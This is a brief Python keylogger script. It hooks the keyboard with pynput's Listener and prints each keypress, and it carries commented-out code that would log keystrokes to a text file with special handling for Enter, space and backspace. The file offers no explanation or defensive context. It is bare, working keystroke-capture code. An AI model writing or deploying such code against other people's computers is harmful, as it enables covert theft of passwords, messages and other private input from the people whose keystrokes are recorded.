import datetime
from pynput.keyboard import Listener

#f = open("sources/keylogger.txt","w")

def key_recorder(key):
	key=str(key)

	print(key)

#	if key == "'\\x03'":
#		f.close()
#		quit()
#	elif key == 'Key.enter':
#		f.write("\n")
#	elif key == 'Key.space':
#		f.write(" ")
#	elif key == 'Key.backspace':
#		f.write('%BORRAR%')
#	else:
#		f.write(key.replace("'",""))

with Listener(on_press=key_recorder) as l:
	l.join()

